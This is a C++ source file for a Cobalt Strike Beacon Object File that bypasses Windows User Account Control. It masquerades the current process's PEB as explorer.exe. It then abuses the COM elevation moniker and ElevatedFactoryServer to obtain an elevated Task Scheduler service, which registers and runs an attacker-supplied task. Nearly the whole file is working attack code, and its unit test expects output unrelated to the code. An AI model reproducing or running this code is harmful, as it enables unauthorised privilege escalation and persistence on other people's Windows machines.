#include "com_helper.h"
#include "base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

#pragma warning( disable: 4996 )

extern "C" {
#include "beacon.h"

	DFR(MSVCRT, malloc);
	DFR(MSVCRT, wcslen);
	DFR(MSVCRT, wcscpy);
	DFR(MSVCRT, wcscat);
	DFR(MSVCRT, memset);
	DFR(MSVCRT, free);
	DFR(MSVCRT, _wcsicmp);
	DFR(MSVCRT, _beginthreadex);
	DFR(MSVCRT, _endthreadex);
    #define malloc MSVCRT$malloc
	#define wcslen MSVCRT$wcslen
	#define wcscpy MSVCRT$wcscpy
	#define wcscat MSVCRT$wcscat
	#define memset MSVCRT$memset
	#define free MSVCRT$free
	#define _wcsicmp MSVCRT$_wcsicmp
	#define _beginthreadex MSVCRT$_beginthreadex
	#define _endthreadex MSVCRT$_endthreadex

	DFR(OLEAUT32, SysAllocString);
	#define SysAllocString OLEAUT32$SysAllocString

	DFR(KERNEL32, GetLastError);
	DFR(KERNEL32, Sleep);
	DFR(KERNEL32, CloseHandle);
	#define GetLastError KERNEL32$GetLastError
	#define Sleep KERNEL32$Sleep
	#define CloseHandle KERNEL32$CloseHandle

#ifndef _DEBUG
	// needed to resolve beacon linker errors
	void ___chkstk_ms() { }

	WINBASEAPI errno_t __cdecl MSVCRT$wcscat_s(wchar_t*, rsize_t, const wchar_t*);
	#define wcscat_s MSVCRT$wcscat_s
	WINBASEAPI errno_t __cdecl MSVCRT$wcscpy_s(wchar_t*, rsize_t, const wchar_t*);
	#define wcscpy_s MSVCRT$wcscpy_s
#endif

	BOOL MasqueradePEB()
	{
		DFR_LOCAL(KERNEL32, GetProcAddress);
		DFR_LOCAL(KERNEL32, GetModuleHandleW);
		DFR_LOCAL(KERNEL32, GetCurrentProcessId);
		DFR_LOCAL(KERNEL32, OpenProcess);
		DFR_LOCAL(KERNEL32, ReadProcessMemory);
		DFR_LOCAL(KERNEL32, GetWindowsDirectoryW);
		DFR_LOCAL(KERNEL32, GetModuleFileNameW);

		typedef struct _UNICODE_STRING {
			USHORT Length;
			USHORT MaximumLength;
			PWSTR  Buffer;
		} UNICODE_STRING, * PUNICODE_STRING;

		typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
			HANDLE ProcessHandle,
			DWORD ProcessInformationClass,
			PVOID ProcessInformation,
			DWORD ProcessInformationLength,
			PDWORD ReturnLength
			);

		typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(
			PRTL_CRITICAL_SECTION CriticalSection
			);

		typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(
			PRTL_CRITICAL_SECTION CriticalSection
			);

		typedef void (WINAPI* _RtlInitUnicodeString)(
			PUNICODE_STRING DestinationString,
			PCWSTR SourceString
			);

		typedef struct _LIST_ENTRY {
			struct _LIST_ENTRY* Flink;
			struct _LIST_ENTRY* Blink;
		} LIST_ENTRY, * PLIST_ENTRY;

		typedef struct _PROCESS_BASIC_INFORMATION
		{
			LONG ExitStatus;
			PVOID PebBaseAddress;
			ULONG_PTR AffinityMask;
			LONG BasePriority;
			ULONG_PTR UniqueProcessId;
			ULONG_PTR ParentProcessId;
		} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

		typedef struct _PEB_LDR_DATA {
			ULONG Length;
			BOOLEAN Initialized;
			HANDLE SsHandle;
			LIST_ENTRY InLoadOrderModuleList;
			LIST_ENTRY InMemoryOrderModuleList;
			LIST_ENTRY InInitializationOrderModuleList;
			PVOID EntryInProgress;
			BOOLEAN ShutdownInProgress;
			HANDLE ShutdownThreadId;
		} PEB_LDR_DATA, * PPEB_LDR_DATA;

		typedef struct _RTL_USER_PROCESS_PARAMETERS {
			BYTE           Reserved1[16];
			PVOID          Reserved2[10];
			UNICODE_STRING ImagePathName;
			UNICODE_STRING CommandLine;
		} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

		// Partial PEB
		typedef struct _PEB {
			BOOLEAN InheritedAddressSpace;
			BOOLEAN ReadImageFileExecOptions;
			BOOLEAN BeingDebugged;
			union
			{
				BOOLEAN BitField;
				struct
				{
					BOOLEAN ImageUsesLargePages : 1;
					BOOLEAN IsProtectedProcess : 1;
					BOOLEAN IsLegacyProcess : 1;
					BOOLEAN IsImageDynamicallyRelocated : 1;
					BOOLEAN SkipPatchingUser32Forwarders : 1;
					BOOLEAN SpareBits : 3;
				};
			};
			HANDLE Mutant;

			PVOID ImageBaseAddress;
			PPEB_LDR_DATA Ldr;
			PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
			PVOID SubSystemData;
			PVOID ProcessHeap;
			PRTL_CRITICAL_SECTION FastPebLock;
		} PEB, * PPEB;

		typedef struct _LDR_DATA_TABLE_ENTRY {
			LIST_ENTRY InLoadOrderLinks;
			LIST_ENTRY InMemoryOrderLinks;
			union
			{
				LIST_ENTRY InInitializationOrderLinks;
				LIST_ENTRY InProgressLinks;
			};
			PVOID DllBase;
			PVOID EntryPoint;
			ULONG SizeOfImage;
			UNICODE_STRING FullDllName;
			UNICODE_STRING BaseDllName;
			ULONG Flags;
			WORD LoadCount;
			WORD TlsIndex;
			union
			{
				LIST_ENTRY HashLinks;
				struct
				{
					PVOID SectionPointer;
					ULONG CheckSum;
				};
			};
			union
			{
				ULONG TimeDateStamp;
				PVOID LoadedImports;
			};
		} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

		DWORD dwPID;
		PROCESS_BASIC_INFORMATION pbi;
		PPEB peb;
		PPEB_LDR_DATA pld;
		PLDR_DATA_TABLE_ENTRY ldte;

		_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
		if (NtQueryInformationProcess == NULL) {
			BeaconPrintf(CALLBACK_ERROR, "GetFunction NtQueryInformationProcess error: %x", GetLastError());
			return FALSE;
		}

		_RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)
			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlEnterCriticalSection");
		if (RtlEnterCriticalSection == NULL) {
			BeaconPrintf(CALLBACK_ERROR, "GetFunction RtlEnterCriticalSection error: %x", GetLastError());
			return FALSE;
		}

		_RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)
			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlLeaveCriticalSection");
		if (RtlLeaveCriticalSection == NULL) {
			BeaconPrintf(CALLBACK_ERROR, "GetFunction RtlLeaveCriticalSection error: %x", GetLastError());
			return FALSE;
		}

		_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString");
		if (RtlInitUnicodeString == NULL) {
			BeaconPrintf(CALLBACK_ERROR, "GetFunction RtlInitUnicodeString error: %x", GetLastError());
			return FALSE;
		}

		dwPID = GetCurrentProcessId();
		BeaconPrintf(CALLBACK_OUTPUT, "Current Process PID: %d", dwPID);

		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
		if (hProcess == INVALID_HANDLE_VALUE)
		{
			BeaconPrintf(CALLBACK_ERROR, "Failed to OpenProcess: %x", GetLastError());
			return FALSE;
		}

		// Retrieves information about the specified process.
		NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

		// Read pbi PebBaseAddress into PEB Structure
		if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
			BeaconPrintf(CALLBACK_ERROR, "Failed to Read pbi PebBaseAddress into PEB Structure: %x", GetLastError());
			return FALSE;
		}

		// Read Ldr Address into PEB_LDR_DATA Structure
		if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) {
			BeaconPrintf(CALLBACK_ERROR, "Failed to Read Ldr Address into PEB_LDR_DATA Structure: %x", GetLastError());
			return FALSE;
		}

		// Let's overwrite UNICODE_STRING structs in memory

		// First set Explorer.exe location buffer
		WCHAR chExplorer[MAX_PATH + 1];
		GetWindowsDirectoryW(chExplorer, MAX_PATH);
		wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), L"\\explorer.exe");

		LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
		wcscpy_s(pwExplorer, MAX_PATH, chExplorer);

		// Take ownership of PEB
		RtlEnterCriticalSection(peb->FastPebLock);

		// Masquerade ImagePathName and CommandLine 
		RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
		RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);

		// Masquerade FullDllName and BaseDllName
		WCHAR wFullDllName[MAX_PATH];
		WCHAR wExeFileName[MAX_PATH];
		GetModuleFileNameW(NULL, wExeFileName, MAX_PATH);

		LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
		LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
		do
		{
			// Read InLoadOrderModuleList.Flink Address into LDR_DATA_TABLE_ENTRY Structure
			if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) 
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to Read InLoadOrderModuleList.Flink Address into LDR_DATA_TABLE_ENTRY Structure: %x", GetLastError());
				return FALSE;
			}

			// Read FullDllName into string
			if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to Read FullDllName into string: %x", GetLastError());
				return FALSE;
			}

			if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
				RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
				RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
				break;
			}

			pNextModuleInfo = ldte->InLoadOrderLinks.Flink;

		} while (pNextModuleInfo != pStartModuleInfo);

		//Release ownership of PEB
		RtlLeaveCriticalSection(peb->FastPebLock);

		// Release Process Handle
		CloseHandle(hProcess);

		Sleep(2000);

		if (_wcsicmp(chExplorer, wFullDllName) != 0) {
			BeaconPrintf(CALLBACK_ERROR, "Failed to MasqueradePEB");
			return FALSE;
		}

		return TRUE;
	}

	HRESULT ucmAllocateElevatedObject(
		_In_ LPWSTR lpObjectCLSID,
		_In_ REFIID riid,
		_In_ DWORD dwClassContext,
		_Outptr_ void** ppv
	)
	{
		DFR_LOCAL(OLE32, CoGetObject);

		BOOL        bCond = FALSE;
		DWORD       classContext;
		HRESULT     hr = E_FAIL;
		PVOID       ElevatedObject = NULL;

		BIND_OPTS3  bop;
		WCHAR       szMoniker[MAX_PATH];

		do {

			if (wcslen(lpObjectCLSID) > 64)
				break;

			memset(&bop, 0, sizeof(bop));
			bop.cbStruct = sizeof(bop);

			classContext = dwClassContext;
			if (dwClassContext == 0)
				classContext = CLSCTX_LOCAL_SERVER;

			bop.dwClassContext = classContext;

			wcscpy(szMoniker, T_ELEVATION_MONIKER_ADMIN);
			wcscat(szMoniker, lpObjectCLSID);

			BeaconPrintf(CALLBACK_OUTPUT, "Moniker: %S", szMoniker);

			hr = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);
			if (FAILED(hr))
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to CoGetObject: %x", hr);
			}

		} while (bCond);

		*ppv = ElevatedObject;

		return hr;
	}

	void ucmVirtualFactoryServer(
		wchar_t* taskname,
		wchar_t* xml
	)
	{
		DFR_LOCAL(OLE32, CoInitializeEx);
		DFR_LOCAL(OLE32, CoUninitialize);
		DFR_LOCAL(OLEAUT32, VariantInit);
		DFR_LOCAL(OLEAUT32, VariantClear);

		IID IID_ElevatedFactoryServer = { 0x804BD226, 0xAF47, 0x04D71, 0xB4, 0x92, 0x44, 0x3A, 0x57, 0x61, 0x0B, 0x08 };
		CLSID CLSID_TaskScheduler = { 0x0f87369f, 0xa4e5, 0x4cfc, 0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd };
		IID IID_ITaskService = { 0x2FABA4C7, 0x4DA9, 0x4013, 0x96, 0x97, 0x20, 0xCC, 0x3F, 0xD4, 0x0F, 0x85 };

		//REFIID RIID_ElevatedFactoryServer = reinterpret_cast<const IID&>(IID_ElevatedFactoryServer);
		//REFCLSID RCLSID_TaskScheduler = reinterpret_cast<const CLSID&>(CLSID_TaskScheduler);
		//REFIID RIID_ITaskService = reinterpret_cast<const IID&>(IID_ITaskService);

		HRESULT hr_init;
		HRESULT r;
		IElevatedFactoryServer* pElevatedServer = NULL;
		IRegisteredTask* pTask = NULL;
		IRunningTask* pRunningTask = NULL;
		ITaskService* pService = NULL;

		TASK_STATE taskState = TASK_STATE_UNKNOWN;

		hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
		if (SUCCEEDED(hr_init))
		{
			BeaconPrintf(CALLBACK_OUTPUT, "CoInitializeEx Successful!");

			r = ucmAllocateElevatedObject((LPWSTR)T_CLSID_VirtualFactoryServer,
				IID_ElevatedFactoryServer,
				CLSCTX_LOCAL_SERVER,
				(VOID**)&pElevatedServer);

			if (FAILED(r))
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to ucmAllocateElevatedObject: %x", r);
				goto cleanup;
			}

			if (pElevatedServer == NULL) {
				r = E_OUTOFMEMORY;
				BeaconPrintf(CALLBACK_ERROR, "Failed to ucmAllocateElevatedObject: %x", r);
				goto cleanup;
			}

			r = pElevatedServer->lpVtbl->ServerCreateElevatedObject(pElevatedServer,
				CLSID_TaskScheduler,
				IID_ITaskService,
				(void**)&pService);

			if (FAILED(r))
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to ServerCreateElevatedObject: %x", r);
				goto cleanup;
			}

			if (pService == NULL) {
				r = E_OUTOFMEMORY;
				BeaconPrintf(CALLBACK_ERROR, "Failed to ServerCreateElevatedObject: %x", r);
				goto cleanup;
			}

			VARIANT varDummy;
			ITaskFolder* pTaskFolder = NULL;
			BSTR bstrTaskFolder = NULL, bstrTaskXML = NULL, bstrTaskName = NULL;
			
			bstrTaskFolder = SysAllocString(L"\\");
			if (bstrTaskFolder == NULL)
				goto cleanup;

			bstrTaskName = SysAllocString(taskname);
			if (bstrTaskName == NULL)
				goto cleanup;

			bstrTaskXML = SysAllocString(xml);
			if (bstrTaskXML == NULL)
				goto cleanup;

			VariantInit(&varDummy);

			r = pService->Connect(varDummy,
				varDummy,
				varDummy,
				varDummy);

			if (FAILED(r))
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to Connect to Task Server: %x", r);
				goto cleanup;
			}

			r = pService->GetFolder(bstrTaskFolder, &pTaskFolder);

			if (r != S_OK || pTaskFolder == NULL)
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to GetFolder: %x", r);
				goto cleanup;
			}

			r = pTaskFolder->RegisterTask(bstrTaskName, bstrTaskXML, 0,
				varDummy, varDummy, TASK_LOGON_INTERACTIVE_TOKEN, varDummy, &pTask);

			if (r != S_OK || pTask == NULL)
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to RegisterTask: %x", r);
				goto cleanup;
			}

			BeaconPrintf(CALLBACK_OUTPUT, "RegisterTask Successful!");

			r = pTask->Run(varDummy, &pRunningTask);

			if (r != S_OK || pRunningTask == NULL)
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to Run Task: %x", r);
				goto cleanup;
			}

			BeaconPrintf(CALLBACK_OUTPUT, "Run Task Successful!");
			//pRunningTask->lpVtbl->Stop(pRunningTask);
			//pTaskFolder->lpVtbl->DeleteTask(pTaskFolder, bstrTaskName, 0);

		cleanup:
			if (pElevatedServer) {
				pElevatedServer->lpVtbl->Release(pElevatedServer);
			}
			if (pService) {
				pService->Release();
			}
			if (pTaskFolder) {
				pTaskFolder->Release();
			}
			if (pTask) {
				pTask->Release();
			}

			VariantClear(&varDummy);
			CoUninitialize();
		}
		else BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx Failed!");
	}

	void bypassUACaddschtask(wchar_t* taskname, wchar_t* xml)
	{
		if (MasqueradePEB())
		{
			ucmVirtualFactoryServer(taskname, xml);
		}
	}

	typedef struct Params {
		wchar_t task[512];
		wchar_t xml[2048];
	} Params;

	unsigned __stdcall BeginStub(void* p)
	{
		Params* params = (Params*)p;
		bypassUACaddschtask(params->task, params->xml);
		return 0;
	}

	LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo)
	{
		_endthreadex(ExceptionInfo->ExceptionRecord->ExceptionCode);
		return EXCEPTION_CONTINUE_EXECUTION;
	}

	void go(char* args, int len)
	{
		DFR_LOCAL(KERNEL32, AddVectoredExceptionHandler);
		DFR_LOCAL(KERNEL32, RemoveVectoredExceptionHandler);
		DFR_LOCAL(KERNEL32, MultiByteToWideChar);
		DFR_LOCAL(KERNEL32, WaitForSingleObject);
		DFR_LOCAL(KERNEL32, GetExitCodeThread);

		datap parser;
		DWORD exitcode = 0;
		HANDLE thread = NULL;
		PVOID handler = NULL;
		Params* params = NULL;

		wchar_t* TaskName = NULL;
		wchar_t* XmlBuffer = NULL;

		BeaconDataParse(&parser, args, len);
		{
			TaskName = (wchar_t*)BeaconDataExtract(&parser, NULL);
			XmlBuffer = (wchar_t*)BeaconDataExtract(&parser, NULL);
		}

		params = (Params*)malloc(sizeof(Params));

		wcscpy(params->task, TaskName);
		wcscpy(params->xml, XmlBuffer);

		handler = AddVectoredExceptionHandler(0, (PVECTORED_EXCEPTION_HANDLER)PvectoredExceptionHandler);
		thread = (HANDLE)_beginthreadex(NULL, 0, BeginStub, params, 0, NULL);
		WaitForSingleObject(thread, INFINITE);
		GetExitCodeThread(thread, &exitcode);
		if (exitcode != 0)
		{
			BeaconPrintf(CALLBACK_ERROR, "An exception occured while running: %x\n", exitcode);
		}
		if (thread) { CloseHandle(thread); }
		if (handler) { RemoveVectoredExceptionHandler(handler); }
		if (params) { free(params); }
	}
}


// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)
#include <comdef.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "ntdll.lib")

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif